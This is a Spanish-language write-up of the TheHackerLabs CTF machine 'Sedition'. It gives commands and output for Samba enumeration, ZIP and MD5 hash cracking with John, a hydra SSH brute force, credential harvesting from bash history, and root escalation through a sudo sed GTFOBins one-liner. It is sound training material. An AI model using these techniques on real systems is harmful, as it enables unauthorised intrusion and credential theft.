---
title: "Sedition - TheHackerLabs"
date: 2025-09-10
draft: false
slug: "THL-writeup-sedition"
excerpt: "Esta fue una máquina sencilla. Después de analizar los escaneos, vemos que podemos listar los archivos compartidos del servicio Samba. Al listarlos, encontramos un archivo ZIP, que descargamos y crackeamos, descubriendo un archivo de texto que contiene una contraseña. Al no tener un usuario para esa contraseña, decidimos aplicar Fuerza Bruta al servicio SSH, encontrando un usuario válido para esa contraseña y logrando acceso inicial a la máquina víctima. Dentro del SSH, encontramos que es posible leer el historial de la shell del usuario actual, siendo ahí donde encontramos credenciales de acceso para el servicio MariaDB. Enumeramos una base de datos de MariaDB, encontrando en una tabla la contraseña hasheada de otro usuario de la máquina. Crackeamos esa contraseña hasheada y ganamos acceso como ese nuevo usuario. Revisando sus privilegios, vemos que podemos usar el binario sed como Root. Usamos la guía de GTFOBins para abusar de los permisos sudoers del binario sed, logrando escalar privilegios convirtiéndonos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Samba", "MariaDB", "Samba Enumeration", "Information Leakage", "Cracking Hash", "Cracking ZIP File", "Brute Force Attack", "Plaintext Credentials Exposed in Shell History", "Password Reuse", "MariaDB Enumeration", "Cracking MD5 Hash", "Abusing Sudoers Privileges On Sed Binary", "Privesc - Abusing Sudoers Privileges On Sed Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "crackmapexec"
  - "smbmap"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "cat"
  - "ssh"
  - "grep"
  - "hydra"
  - "ss"
  - "mariadb"
  - "hash-identifier"
  - "hashid"
  - "CrackStation"
  - "su"
  - "sudo"
  - "GTFOBins"
  - "sed"
links:
  - "https://crackstation.net/"
  - "https://gtfobins.github.io/gtfobins/sed/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-sedition/sedition.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.100
PING 192.168.100.100 (192.168.100.100) 56(84) bytes of data.
64 bytes from 192.168.100.100: icmp_seq=1 ttl=64 time=1.96 ms
64 bytes from 192.168.100.100: icmp_seq=2 ttl=64 time=1.12 ms
64 bytes from 192.168.100.100: icmp_seq=3 ttl=64 time=0.848 ms
64 bytes from 192.168.100.100: icmp_seq=4 ttl=64 time=0.822 ms

--- 192.168.100.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.822/1.187/1.964/0.462 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 13:47 CST
Initiating ARP Ping Scan at 13:47
Scanning 192.168.100.100 [1 port]
Completed ARP Ping Scan at 13:47, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:47
Scanning 192.168.100.100 [65535 ports]
Discovered open port 139/tcp on 192.168.100.100
Discovered open port 445/tcp on 192.168.100.100
Discovered open port 65535/tcp on 192.168.100.100
Completed SYN Stealth Scan at 13:47, 13.75s elapsed (65535 total ports)
Nmap scan report for 192.168.100.100
Host is up, received arp-response (0.00076s latency).
Scanned at 2025-09-10 13:47:10 CST for 14s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
139/tcp   open  netbios-ssn  syn-ack ttl 64
445/tcp   open  microsoft-ds syn-ack ttl 64
65535/tcp open  unknown      syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
           Raw packets sent: 83716 (3.683MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo tres puertos abiertos y es curioso el uso de estos puertos, pues no es muy común verlos en una **máquina Linux**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 139,445,65535 192.168.100.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 13:48 CST
Nmap scan report for 192.168.100.100
Host is up (0.00067s latency).

PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)

| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:

| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-09-10T19:48:11
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy curioso ver el **puerto 65535** con el **servicio SSH** activo.

El escaneo menciona que el **servicio Samba** requiere de autenticación, pero no es necesaria. Quiero suponer que se refiere a que no es necesaria para listar archivos compartidos.

Veamos si podemos ver esos archivos.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración del Servicio Samba {#Samba}

Veamos qué información obtenemos con **crackmapexec**:
```bash
crackmapexec smb 192.168.100.100
SMB         192.168.100.100 445    SEDITION         [*] Windows 6.1 Build 0 (name:SEDITION) (domain:SEDITION) (signing:False) (SMBv1:False)
```
Nos muestra el dominio de la máquina y menciona que no es necesaria la autenticación.

Probemos con **smbmap** si podemos listar los archivos compartidos:
```bash
smbmap -H 192.168.100.100 --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.100:445	Name: 192.168.100.100     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	backup                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba Server)
	nobody                                            	NO ACCESS	Home Directories
[*] Closed 1 connections
```
Muy bien, podemos listarlos y vemos que hay un directorio que podemos leer.

Veamos su contenido:
```bash
smbmap -H 192.168.100.100 -r backup --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.100:445	Name: 192.168.100.100     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	backup                                            	READ ONLY	
	./backup
	dr--r--r--                0 Sun Jul  6 11:02:52 2025	.
	dr--r--r--                0 Sun Jul  6 12:15:13 2025	..
	fr--r--r--              216 Sun Jul  6 11:02:31 2025	secretito.zip
	IPC$                                              	NO ACCESS	IPC Service (Samba Server)
	nobody                                            	NO ACCESS	Home Directories
[*] Closed 1 connections
```
Hay un **archivo ZIP**.

Descarguémoslo:
```bash
smbmap -H 192.168.100.100 --download backup/secretito.zip --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[+] Starting download: backup\secretito.zip (216 bytes)
[+] File output to: /../TheHackersLabs/Sedition/content/192.168.100.100-backup_secretito.zip
[*] Closed 1 connections

mv 192.168.100.100-backup_secretito.zip secretito.zip
```

Tratemos de descomprimirlo:
```bash
unzip secretito.zip
Archive:  secretito.zip
[secretito.zip] password password:
```
Necesitamos una contraseña, entonces, vamos a crackear este archivo.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeo de Archivo ZIP y Ganando Acceso a Máquina Víctima Vía SSH {#Cracking}

Obtengamos el Hash de ese **archivo ZIP**:
```bash
zip2john secretito.zip > hash
ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0
```

Con **JohnTheRipper**, crackeamos el Hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sebastian        (secretito.zip/password)     
1g 0:00:00:00 DONE (2025-09-10 13:55) 16.66g/s 204800p/s 204800c/s 204800C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Ahora sí, ya podemos descomprimir el **archivo ZIP**:
```bash
unzip secretito.zip
Archive:  secretito.zip
[secretito.zip] password password: 
 extracting: password

cat password
...
```
Resulta que tiene una contraseña.

Pero no tenemos un usuario válido, aunque la contraseña del **archivo ZIP** parece un usuario.

Comprobemos si lo es con **crackmapexec**:
```bash
crackmapexec smb 192.168.100.100 -u 'sebastian' -p '********'
SMB         192.168.100.100 445    SEDITION         [*] Windows 6.1 Build 0 (name:SEDITION) (domain:SEDITION) (signing:False) (SMBv1:False)
SMB         192.168.100.100 445    SEDITION         [+] SEDITION\sebastian:*********
```
Lo es o, por lo menos, funciona como un usuario para el **servicio Samba**.

Pero este usuario no sirve para ver el contenido de otros directorios:
```bash
smbmap -H 192.168.100.100 -u 'sebastian' -p '*********' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.100:445	Name: 192.168.100.100     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	backup                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba Server)
	nobody                                            	NO ACCESS	Home Directories
[*] Closed 1 connections
```
Tampoco funciona si lo usamos con el **servicio SSH**.

Algo que podemos hacer con estas credenciales, es obtener los usuarios registrados en la máquina con **crackmapexec**:
```bash
crackmapexec smb 192.168.100.100 -u 'sebastian' -p '*********' --users
SMB         192.168.100.100 445    SEDITION         [*] Windows 6.1 Build 0 (name:SEDITION) (domain:SEDITION) (signing:False) (SMBv1:False)
SMB         192.168.100.100 445    SEDITION         [+] SEDITION\sebastian:********* 
SMB         192.168.100.100 445    SEDITION         [*] Trying with SAMRPC protocol
SMB         192.168.100.100 445    SEDITION         [+] Enumerated domain user(s)
SMB         192.168.100.100 445    SEDITION         SEDITION\cowboy                         
SMB         192.168.100.100 445    SEDITION         [+] Enumerated domain user(s)
SMB         192.168.100.100 445    SEDITION         SEDITION\cowboy
```
Existe el **usuario cowboy**.

Probemos si esa contraseña sirve con este usuario para entrar al **servicio SSH**:
```bash
ssh cowboy@192.168.100.100 -p 65535
cowboy@192.168.100.100's password: 
Linux Sedition 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64
...
Last login: Sun Jul  6 20:00:56 2025
cowboy@Sedition:~$ whoami
cowboy
```
Funcionó.

Nada más por las dudas, veamos qué usuarios existen:
```bash
cowboy@Sedition:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
cowboy:x:1001:1001:cowboy,,,:/home/cowboy:/bin/bash
```
Solo hay 2 usuarios aparte del **Root**, entonces el **usuario sebastian** nunca existió.

Lo que me da a entender que el **servicio Samba** está tan mal configurado, que permite a usuarios inexistentes listar sus archivos compartidos, los usuarios de la máquina víctima, etc.

### Aplicando Fuerza Bruta al Servicio SSH {#Hydra}

Digamos que ocupar la contraseña del **archivo ZIP** no hubiera funcionado.

En dicho caso, podemos aplicar **Fuerza Bruta** al **servicio Samba y SSH**, para averiguar si existe un usuario al que le pertenezca la contraseña.

Pero enfoquémonos en el **servicio SSH**, así que usemos la herramienta **hydra** para aplicar la **Fuerza Bruta**:
```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p '**********' ssh://192.168.100.100 -s 65535 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 16:37:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://192.168.100.100:65535/
[65535][ssh] host: 192.168.100.100   login: cowboy   password: ************
```
Excelente, tenemos a un usuario válido.

Recuerda detener el ataque, ya que si no el ataque seguirá activo.

Ya sabemos que el usuario y contraseña funcionan, así que continuemos.

## Post Explotación {#Post}

### Enumeración de Servicio MariaDB {#MariaDB}

Al revisar los archivos del usuario, vemos que se puede leer el historial de **Bash**:
```bash
cowboy@Sedition:~$ ls -la
total 24
drwx------ 2 cowboy cowboy 4096 jul  6 20:08 .
drwxr-xr-x 4 root   root   4096 jul  6 18:56 ..
-rw------- 1 cowboy cowboy   73 jul  6 20:13 .bash_history
-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout
-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc
-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile
```

Si lo leemos, encontraremos algo interesante:
```bash
cowboy@Sedition:~$ cat .bash_history 
history
exit
mariadb
mariadb -u cowboy -p************
su debian
```
Tenemos un usuario y contraseña para el **servicio MariaDB** que es la misma con la que entramos al **SSH**. Observa que después se autentica como el **usuario debian**.

Comprobemos con el comando **ss** si está activo el **puerto 3306**:
```bash
cowboy@Sedition:~$ ss -tulnp | grep tcp
tcp   LISTEN 0      50             0.0.0.0:139        0.0.0.0:*          
tcp   LISTEN 0      50             0.0.0.0:445        0.0.0.0:*          
tcp   LISTEN 0      80           127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      128            0.0.0.0:65535      0.0.0.0:*          
tcp   LISTEN 0      50                [::]:139           [::]:*          
tcp   LISTEN 0      50                [::]:445           [::]:*          
tcp   LISTEN 0      128               [::]:65535         [::]:*
```
Ahí está.

Usemos ese mismo comando para entrar en **MariaDB**:
```bash
cowboy@Sedition:~$ mariadb -u cowboy -p***********
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MariaDB [(none)]>
```

Veamos qué bases de datos existén:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,006 sec)
```
Solo hay una BD llamada **bunker**, aparte de la BD por defecto.

Usemos la **BD bunker** y veamos sus tablas:
```bash
MariaDB [(none)]> use bunker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [bunker]> show tables;
+------------------+

| Tables_in_bunker |
+------------------+

| users            |
+------------------+
1 row in set (0,000 sec)
```
Solo hay una tabla.

Veamos su contenido:
```bash
MariaDB [bunker]> select * from users;
+--------+----------------------------------+

| user   | password                         |
+--------+----------------------------------+

| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,002 sec)
```
Tenemos la contraseña del **usuario debian**, pero parece que fue hasheada en **MD5**. Esto lo sabemos por los caracteres que tiene el Hash.

Vamos a crackear ese Hash.

### Crackeo de Hash MD5 y Ganando Acceso como Usuario Debian {#CrackeoHash}

Una de las mejores herramientas para identificar un Hash es **hash-identifier**:
```bash
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 7c6a180b36896a0a8c02787eeafb0e4c

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
...
```

También está la herramienta **hashid**, pero no es tan buena como la herramienta anterior, ya que no te da el formato al que pertenece el Hash, sino que da varios:
```bash
hashid '7c6a180b36896a0a8c02787eeafb0e4c'
Analyzing '7c6a180b36896a0a8c02787eeafb0e4c'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5
...
```

Una vez que identificamos el Hash, podemos crackearlo con **JohnTheRipper**, indicando el formato del Hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashMD5 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
******        (?)     
1g 0:00:00:00 DONE (2025-09-10 14:12) 33.33g/s 6400p/s 6400c/s 6400C/s 123456..november
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña del **usuario debian**.

De forma alternativa, podemos usar la página **CrackStation**:
* <a href="https://crackstation.net/" target="_blank">CrackStation</a>

Siendo una página muy buena contra **hashes MD5**.

Solo tienes que darle el Hash (el captcha si es necesario) y darle al botón **Crack Hashes**:

<p align="center">
<img src="/assets/images/THL-writeup-sedition/Captura1.png">
</p>

Funcionó y tenemos la contraseña crackeada.

Ya solo probemos la contraseña:
```bash
cowboy@Sedition:~$ su debian
Contraseña: 
debian@Sedition:/home/cowboy$ whoami
debian
```
Ahora somos el **usuario debian**.

Y aquí encontraremos la flag del usuario:
```bash
debian@Sedition:/home/cowboy$ cd ../debian/
debian@Sedition:~$ ls
backup  flag.txt
debian@Sedition:~$ cat flag.txt
...
```

### Abusando de Permisos Sudoers sobre Binario sed para Escalar Privilegios {#sed}

Veamos qué privilegios tiene nuestro usuario:
```bash
debian@Sedition:~$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```
Podemos usar el binario **sed** con privilegios de **Root**.

Encontraremos una forma de escalar privilegios usando este binario en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/sed/" target="_blank">GTFOBins: sed</a>

Usaremos este comando:

<p align="center">
<img src="/assets/images/THL-writeup-sedition/Captura2.png">
</p>

Apliquémoslo:
```bash
debian@Sedition:~$ sudo sed -n '1e exec bash 1>&0' /etc/hosts
root@Sedition:/home/debian# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
root@Sedition:/home/debian# cd /root
root@Sedition:~# ls
root.txt
root@Sedition:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
